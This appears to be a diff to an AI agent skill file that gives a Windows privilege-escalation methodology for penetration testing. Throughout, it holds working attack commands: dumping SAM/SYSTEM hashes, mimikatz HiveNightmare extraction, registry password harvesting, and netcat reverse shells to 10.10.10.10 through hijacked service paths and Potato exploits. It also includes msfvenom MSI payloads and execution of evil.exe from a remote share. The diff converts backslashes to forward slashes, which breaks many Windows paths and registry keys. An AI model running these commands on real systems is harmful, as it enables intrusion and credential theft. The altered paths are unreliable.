@@ -1,6 +1,6 @@
 ---
 name: windows-privilege-escalation
-description: "Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements."
+description: Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. Use when the task involves windows privilege escalation.
 risk: offensive
 source: community
 author: zebbern
@@ -104,7 +104,7 @@ nltest /DCLIST:DomainName
 #### Antivirus Enumeration
 ```powershell
 # Check AV products
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+WMIC /Node:localhost /Namespace:\\root/SecurityCenter2 Path AntivirusProduct Get displayName
 ```
 
 ### 2. Credential Harvesting
@@ -112,14 +112,14 @@ WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get
 #### SAM and SYSTEM Files
 ```powershell
 # SAM file locations
-%SYSTEMROOT%\repair\SAM
-%SYSTEMROOT%\System32\config\RegBack\SAM
-%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%/repair/SAM
+%SYSTEMROOT%/System32/config/RegBack/SAM
+%SYSTEMROOT%/System32/config/SAM
 
 # SYSTEM file locations
-%SYSTEMROOT%\repair\system
-%SYSTEMROOT%\System32\config\SYSTEM
-%SYSTEMROOT%\System32\config\RegBack\system
+%SYSTEMROOT%/repair/system
+%SYSTEMROOT%/System32/config/SYSTEM
+%SYSTEMROOT%/System32/config/RegBack/system
 
 # Extract hashes (from Linux after obtaining files)
 pwdump SYSTEM SAM > sam.txt
@@ -132,13 +132,13 @@ john --format=NT sam.txt
 #### HiveNightmare (CVE-2021-36934)
 ```powershell
 # Check vulnerability
-icacls C:\Windows\System32\config\SAM
-# Vulnerable if: BUILTIN\Users:(I)(RX)
+icacls C:/Windows/System32/config/SAM
+# Vulnerable if: BUILTIN/Users:(I)(RX)
 
 # Exploit with mimikatz
 mimikatz> token::whoami /full
 mimikatz> misc::shadowcopies
-mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+mimikatz> lsadump::sam /system:\\?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM /sam:\\?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SAM
 ```
 
 #### Search for Passwords
@@ -152,14 +152,14 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
 # Windows Autologin credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+reg query "HKLM/SOFTWARE/Microsoft/Windows NT/Currentversion/Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 # PuTTY sessions
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKCU/Software/SimonTatham/PuTTY/Sessions"
 
 # VNC passwords
-reg query "HKCU\Software\ORL\WinVNC3\Password"
-reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+reg query "HKCU/Software/ORL/WinVNC3/Password"
+reg query HKEY_LOCAL_MACHINE/SOFTWARE/RealVNC/WinVNC4 /v password
 
 # Search for specific files
 dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
@@ -169,11 +169,11 @@ where /R C:\ *.ini
 #### Unattend.xml Credentials
 ```powershell
 # Common locations
-C:\unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.inf
-C:\Windows\system32\sysprep\sysprep.xml
+C:/unattend.xml
+C:/Windows/Panther/Unattend.xml
+C:/Windows/Panther/Unattend/Unattend.xml
+C:/Windows/system32/sysprep.inf
+C:/Windows/system32/sysprep/sysprep.xml
 
 # Search for files
 dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul
@@ -197,7 +197,7 @@ for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "'
 #### PowerShell History
 ```powershell
 # View PowerShell history
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type %userprofile%/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
@@ -214,7 +214,7 @@ accesschk.exe -ucqv <service_name>
 # Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
 
 # Exploit vulnerable service
-sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
+sc config <service> binpath= "C:/nc.exe -e cmd.exe 10.10.10.10 4444"
 sc stop <service>
 sc start <service>
 ```
@@ -222,19 +222,19 @@ sc start <service>
 #### Unquoted Service Paths
 ```powershell
 # Find unquoted paths
-wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
-wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:/Windows\\"
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:/Windows\\" | findstr /i /v """
 
 # Exploit: Place malicious exe in path
-# For path: C:\Program Files\Some App\service.exe
-# Try: C:\Program.exe or C:\Program Files\Some.exe
+# For path: C:/Program Files/Some App/service.exe
+# Try: C:/Program.exe or C:/Program Files/Some.exe
 ```
 
 #### AlwaysInstallElevated
 ```powershell
 # Check if enabled
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU/SOFTWARE/Policies/Microsoft/Windows/Installer /v AlwaysInstallElevated
+reg query HKLM/SOFTWARE/Policies/Microsoft/Windows/Installer /v AlwaysInstallElevated
 
 # Both must return 0x1 for vulnerability
 
@@ -242,7 +242,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
 
 # Install (runs as SYSTEM)
-msiexec /quiet /qn /i C:\evil.msi
+msiexec /quiet /qn /i C:/evil.msi
 ```
 
 ### 4. Token Impersonation
@@ -267,13 +267,13 @@ whoami /priv
 #### Potato Attacks
 ```powershell
 # JuicyPotato (Windows Server 2019 and below)
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p c:/windows/system32/cmd.exe -a "/c c:/tools/nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
 
 # PrintSpoofer (Windows 10 and Server 2019)
 PrintSpoofer.exe -i -c cmd
 
 # RoguePotato
-RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999
+RoguePotato.exe -r 10.10.10.10 -e "C:/nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999
 
 # GodPotato
 GodPotato.exe -cmd "cmd /c whoami"
@@ -327,7 +327,7 @@ cmdkey /list
 
 # Use saved credentials
 runas /savecred /user:Administrator "cmd.exe /k whoami"
-runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
+runas /savecred /user:WORKGROUP/Administrator "\\10.10.10.10/share/evil.exe"
 ```
 
 #### WSL Exploitation
@@ -354,18 +354,18 @@ wsl python -c 'import os; os.system("/bin/bash")'
 | PowerUp | `Invoke-AllChecks` | Service/path vulnerabilities |
 | Seatbelt | `Seatbelt.exe -group=all` | Security audit checks |
 | Watson | `Watson.exe` | Missing patches |
-| JAWS | `.\jaws-enum.ps1` | Legacy Windows enum |
+| JAWS | `./jaws-enum.ps1` | Legacy Windows enum |
 | PrivescCheck | `Invoke-PrivescCheck` | Privilege escalation checks |
 
 ### Default Writable Folders
 
 ```
-C:\Windows\Temp
-C:\Windows\Tasks
-C:\Users\Public
-C:\Windows\tracing
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:/Windows/Temp
+C:/Windows/Tasks
+C:/Users/Public
+C:/Windows/tracing
+C:/Windows/System32/spool/drivers/color
+C:/Windows/System32/Microsoft/Crypto/RSA/MachineKeys
 ```
 
 ### Common Privilege Escalation Vectors
@@ -374,7 +374,7 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 |--------|---------------|
 | Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
 | Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
-| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
+| AlwaysInstallElevated | `reg query HKCU\.../Installer /v AlwaysInstallElevated` |
 | Stored credentials | `cmdkey /list` |
 | Token privileges | `whoami /priv` |
 | Scheduled tasks | `schtasks /query /fo LIST /v` |
@@ -424,7 +424,7 @@ sc qc MyService
 
 # Stop service and change binary path
 sc stop MyService
-sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+sc config MyService binpath= "C:/Users/Public/nc.exe 10.10.10.10 4444 -e cmd.exe"
 sc start MyService
 
 # Catch shell as SYSTEM
@@ -433,15 +433,15 @@ sc start MyService
 ### Example 2: AlwaysInstallElevated Exploitation
 ```powershell
 # Verify vulnerability
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU/SOFTWARE/Policies/Microsoft/Windows/Installer /v AlwaysInstallElevated
+reg query HKLM/SOFTWARE/Policies/Microsoft/Windows/Installer /v AlwaysInstallElevated
 # Both return: 0x1
 
 # Generate payload (attacker machine)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi
 
 # Transfer and execute
-msiexec /quiet /qn /i C:\Users\Public\shell.msi
+msiexec /quiet /qn /i C:/Users/Public/shell.msi
 
 # Catch SYSTEM shell
 ```
@@ -453,7 +453,7 @@ whoami /priv
 # SeImpersonatePrivilege Enabled
 
 # Run JuicyPotato
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+JuicyPotato.exe -l 1337 -p c:/windows/system32/cmd.exe -a "/c c:/users/public/nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
 
 # Catch SYSTEM shell
 ```
@@ -462,14 +462,14 @@ JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc
 ```powershell
 # Find unquoted path
 wmic service get name,pathname | findstr /i /v """
-# Result: C:\Program Files\Vuln App\service.exe
+# Result: C:/Program Files/Vuln App/service.exe
 
 # Check write permissions
-icacls "C:\Program Files\Vuln App"
+icacls "C:/Program Files/Vuln App"
 # Result: Users:(W)
 
 # Place malicious binary
-copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"
+copy C:/Users/Public/shell.exe "C:/Program Files/Vuln.exe"
 
 # Restart service
 sc stop "Vuln App"
@@ -479,7 +479,7 @@ sc start "Vuln App"
 ### Example 5: Credential Harvesting from Registry
 ```powershell
 # Check for auto-logon credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query "HKLM/SOFTWARE/Microsoft/Windows NT/Currentversion/Winlogon"
 # DefaultUserName: Administrator
 # DefaultPassword: P@ssw0rd123
 
@@ -493,10 +493,8 @@ runas /user:Administrator cmd.exe
 | Issue | Cause | Solution |
 |-------|-------|----------|
 | Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
-| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
+| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:/path/binary.exe"` |
 | Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
-| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
-| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |
 
-## When to Use
-This skill is applicable to execute the workflow or actions described in the overview.
+
+> Extended reference material: [references/details.md](references/details.md)
